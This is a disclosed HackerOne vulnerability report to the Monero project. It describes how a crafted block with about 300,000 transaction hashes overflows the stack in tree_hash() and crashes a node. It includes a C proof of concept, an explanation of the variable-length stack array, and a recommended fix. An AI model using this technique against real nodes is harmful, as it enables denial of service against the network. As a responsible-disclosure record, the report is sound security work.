# Computing hash of crafted block leads to crash in tree_hash()

## Report Details
- **Report ID**: 519120
- **URL**: https://hackerone.com/reports/519120
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-30T20:31:23.902Z
- **Disclosed**: 2019-07-03T00:11:28.656Z

## Reporter
- **Username**: guido
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
I'm not sure how to test this against against an actual Monero instance, so I'm instead showing an isolated PoC:

```c
#include <cryptonote_basic/cryptonote_format_utils.h>

int main(void)
{
    cryptonote::block b = AUTO_VAL_INIT(b);
    for (size_t i = 0; i < 300000; i++) {
        b.tx_hashes.push_back({});
    }
    std::ostringstream oss;
    binary_archive<true> ba(oss);
    std::string s;
    if ( ::serialization::serialize(ba, b) == true ) {
        s = oss.str();
    } else {
        return 0;
    }

/* Uncomment to crash */
    cryptonote::block b2 = AUTO_VAL_INIT(b2);
    if ( parse_and_validate_block_from_blob(s, b2) == true ) {
        /* Crash */
        get_tx_tree_hash(b2);
    }
    return 0;
}
```

The reason this crashes is because of this code in ```tree_hash```:

```c
    char ints[cnt][HASH_SIZE];
    memset(ints, 0 , sizeof(ints));  // zero out as extra protection for using uninitialized mem
```

```ints``` is allocated on the stack, not on the heap. Its size is dynamic; ```cnt``` (derived from the number of ```tx_hashes``` in this example) multiplied by 32 (```HASH_SIZE```) is the amount of bytes reserved on the stack.

On a typical, modern 64 bit OS, the stack is usually 8MB in size. Hence, a sufficient amount of ```tx_hashes``` will cause more stack to be reserved than is available.
Technically, the reservation of the stack space doesn't cause the crash (this only alters the stack pointer), but the subsequent ```memset``` does.

Note that the serialized size of a block with 300000 tx_hashes is about 9 MB (see ```s.size()```), which is well within the limits of ```CRYPTONOTE_MAX_BLOCK_SIZE``` (500MB).

The best remediation to this issue is to use allocate memory on the heap, not the stack.

## Impact

Crash nodes

## Attachments
No attachments
